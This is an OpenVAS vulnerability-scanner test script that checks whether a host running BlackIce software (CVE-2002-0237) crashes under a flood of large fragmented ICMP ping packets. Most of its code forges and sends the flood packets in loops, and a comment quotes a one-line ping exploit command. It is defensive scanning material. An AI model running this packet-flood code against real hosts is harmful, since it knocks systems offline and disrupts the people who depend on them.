# OpenVAS Vulnerability Test
# $Id: blackice_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: BlackIce DoS (ping flood)
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "It was possible to crash the remote 
machine by flooding it with 10 KB ping packets.

A cracker may use this attack to make this
host crash continuously, preventing you
from working properly.";

tag_solution = "upgrade your BlackIce software or remove it.";

# TBD : eEyes gives this "exploit": ping -s 60000 -c 16 -p CC 1.1.1.1
#       But according to others, it doesn't work.

if(description)
{
 script_id(10927);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(4025);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 script_cve_id("CVE-2002-0237");
 name = "BlackIce DoS (ping flood)";
 script_name(name);
 
 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


 script_description(desc);
 
 summary = "Ping flood the remote machine and kills BlackIce";
 script_summary(summary);
 script_category(ACT_FLOOD);
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family = "Denial of Service";
 

 script_family(family);
		       
 #script_add_preference(name:"Flood length :", type:"entry", value:"600");
 #script_add_preference(name:"Data length :", type:"entry", value:"10000");
 #script_add_preference(name:"MTU :",  type:"entry", value:"576");
 script_require_keys("Settings/ThoroughTests");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("global_settings.inc");

if ( ! thorough_tests ) exit(0);
if(TARGET_IS_IPV6())exit(0);

#
# The script code starts here
#

start_denial();

#fl = script_get_preference("Flood length :");
if (! fl) fl = 600;
#dl = script_get_preference("Data length :");
if (! dl) dl = 60000;
#mtu = script_get_preference("MTU :");
if (! mtu) mtu = 1500; 
maxdata = mtu - 20 - 8;	# IP + ICMP
maxdata = maxdata / 8; maxdata = maxdata * 8;
if (maxdata < 16) maxdata = 544;

src = this_host();
dst = get_host_ip();
id = 666;
seq = 0;

for (i = 0; i < fl; i=i+1)
{
 id = id + 1;
 seq = seq + 1;
 for (j = 0; j < dl; j=j+maxdata)
 {
  datalen = dl - j;
  o = j / 8;
  if (datalen > maxdata) {
   o = o | 0x2000;
   datalen = maxdata;
  }
  ##display(string("i=",i,"; j=", j, "; o=", o, ";dl=", datalen, "\n"));
  ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0, ip_off:o,
                        ip_p:IPPROTO_ICMP, ip_id:id, ip_ttl:0x40,
	     	        ip_src:this_host());
  icmp = forge_icmp_packet(ip:ip, icmp_type:8, icmp_code:0,
	     		  icmp_seq: seq, icmp_id:seq, data:crap(datalen-8));
  send_packet(icmp, pcap_active: 0);
 }
}

alive = end_denial();
if(!alive){
	security_hole();
	set_kb_item(name:"Host/dead", value:TRUE);
}

